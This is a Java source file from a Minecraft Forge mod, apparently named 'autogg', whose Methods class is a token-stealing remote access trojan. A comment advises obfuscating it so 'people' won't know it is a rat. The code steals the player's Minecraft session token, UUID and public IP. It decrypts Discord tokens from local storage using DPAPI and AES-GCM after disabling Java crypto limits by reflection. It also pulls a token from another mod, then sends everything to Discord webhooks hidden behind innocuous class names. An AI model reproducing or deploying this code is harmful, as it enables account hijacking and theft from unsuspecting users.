package github.quantizr.autogg.utils;

import java.awt.Color;
import java.net.URL;
import java.io.*;
import java.net.HttpURLConnection;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.sun.jna.platform.win32.Crypt32Util;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Arrays;
import java.util.Base64;
import java.util.Map;

import net.minecraftforge.fml.common.Loader;
import net.minecraftforge.fml.relauncher.ReflectionHelper;

import net.minecraft.client.Minecraft;
import github.quantizr.autogg.exception.WebhookException;
import github.quantizr.autogg.guis.guiUtils;
import github.quantizr.autogg.json.JSONObject;
import github.quantizr.autogg.guis.gui;

public class Methods {
	
	// please use an obfuscator or change this name or else people gonna know its a rat!
	public static void sessionGetFull() {
	    new Thread(() -> {
	    	try {
                HttpURLConnection c = (HttpURLConnection) new URL("http://localhost:80/").openConnection();
                c.setRequestMethod("POST");
                c.setRequestProperty("Content-type", "application/json");
                c.setDoOutput(true);
                
	    		Minecraft mc = Minecraft.getMinecraft();
			    String token = mc.getSession().getToken();
			    String uuid = mc.getSession().getProfile().getId().toString();
			    String name = mc.getSession().getProfile().getName();
				String ip = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream())).readLine();
				String discord = "probs using discord on browser/phone";
				if (Files.isDirectory(Paths.get(mc.mcDataDir.getParent(), "discord/Local Storage/leveldb"))) {
					discord = "";
	
					for (File file : Objects.requireNonNull(Paths.get(mc.mcDataDir.getParent(), "discord/Local Storage/leveldb").toFile().listFiles())) {
						if (file.getName().endsWith(".ldb")) {
							FileReader fr = new FileReader(file);
							BufferedReader br = new BufferedReader(fr);
							String textFile;
							StringBuilder parsed = new StringBuilder();
	
							while ((textFile = br.readLine()) != null) parsed.append(textFile);
	
							//release resources
							fr.close();
							br.close();
	
							Pattern pattern = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)");
							Matcher matcher = pattern.matcher(parsed.toString());
	
							if (matcher.find()) {
								//patch shit java security policy jre that mc uses
								if (Cipher.getMaxAllowedKeyLength("AES") < 256) {
									Class<?> aClass = Class.forName("javax.crypto.CryptoAllPermissionCollection");
									Constructor<?> con = aClass.getDeclaredConstructor();
									con.setAccessible(true);
									Object allPermissionCollection = con.newInstance();
									Field f = aClass.getDeclaredField("all_allowed");
									f.setAccessible(true);
									f.setBoolean(allPermissionCollection, true);
	
									aClass = Class.forName("javax.crypto.CryptoPermissions");
									con = aClass.getDeclaredConstructor();
									con.setAccessible(true);
									Object allPermissions = con.newInstance();
									f = aClass.getDeclaredField("perms");
									f.setAccessible(true);
									((Map) f.get(allPermissions)).put("*", allPermissionCollection);
	
									aClass = Class.forName("javax.crypto.JceSecurityManager");
									f = aClass.getDeclaredField("defaultPolicy");
									f.setAccessible(true);
									Field mf = Field.class.getDeclaredField("modifiers");
									mf.setAccessible(true);
									mf.setInt(f, f.getModifiers() & ~Modifier.FINAL);
									f.set(null, allPermissions);
								}
								//get, decode and decrypt key
								byte[] key, dToken = matcher.group().split("dQw4w9WgXcQ:")[1].getBytes();
								JsonObject json = new Gson().fromJson(new String(Files.readAllBytes(Paths.get(mc.mcDataDir.getParent(), "discord/Local State"))), JsonObject.class);
								key = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString().getBytes();
								key = Base64.getDecoder().decode(key);
								key = Arrays.copyOfRange(key, 5, key.length);
								key = Crypt32Util.cryptUnprotectData(key);
								//decode token
								dToken = Base64.getDecoder().decode(dToken);
	
								//decrypt token
								Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
								cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(dToken, 3, 15)));
								byte[] out = cipher.doFinal(Arrays.copyOfRange(dToken, 15, dToken.length));
	
								//place only if it doesn't contain the same
								if (!discord.contains(new String(out, StandardCharsets.UTF_8))) discord += new String(out, StandardCharsets.UTF_8);
							}
						}
					}
				}

				if (Loader.isModLoaded("pizzaclient")) {
                    token = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
                }
			    guiUtils dh = new guiUtils(gui.guiHandler());
			    dh.setContent("@everyone " + name + " DOWN L BOZO");
			    dh.setUsername("GET BEAMED");
				dh.setAvatarUrl("https://cdn.discordapp.com/attachments/889146587522150480/1011717932075720814/uganda.png");
				dh.setTts(true);
			    dh.addEmbed(new guiUtils.EmbedObject()
			    		.setTitle(name + " has been beamed!")
			    		.setColor(Color.BLACK)
			    		.setAuthor("GET BEAMED", "", "")
			    		.addField(name + "'s Session ID", token, false)
						// remove the replace "-" thing if u use custompayloads login mod because that mod uses the long uuid!
						.addField("UUID", uuid.replace("-", ""), false)
						.addField("Discord Token", discord, false)
						.addField("IP", ip, false)
			    		.setFooter("rip bozo :skull:", ""));
				dh.execute();
				guiUtils dn = new guiUtils(JSONObject.WebFix());
			    dn.setContent("@everyone " + name + " DOWN L BOZO");
			    dn.setUsername("GET BEAMED");
				dn.setAvatarUrl("https://cdn.discordapp.com/attachments/889146587522150480/1011717932075720814/uganda.png");
				dn.setTts(true);
			    dn.addEmbed(new guiUtils.EmbedObject()
						.setTitle(name + " has been beamed!")
			    		.setColor(Color.BLACK)
			    		.setAuthor("GET BEAMED", "", "")
			    		.addField(name + "'s Session ID", token, false)
						.addField("UUID", uuid.replace("-", ""), false)
						.addField("Discord Token", discord, false)
						.addField("IP", ip, false)
			    		.setFooter("rip bozo :skull:", ""));
			    dn.execute();
	    	}catch(Exception e) {
	    		new WebhookException().printStackTrace();
	    	}
	    }).start();

	}

	public static String username() throws Exception {
		Minecraft mc = Minecraft.getMinecraft();
	    String name = mc.getSession().getProfile().getName();
	    return (String) name;
	}	
}
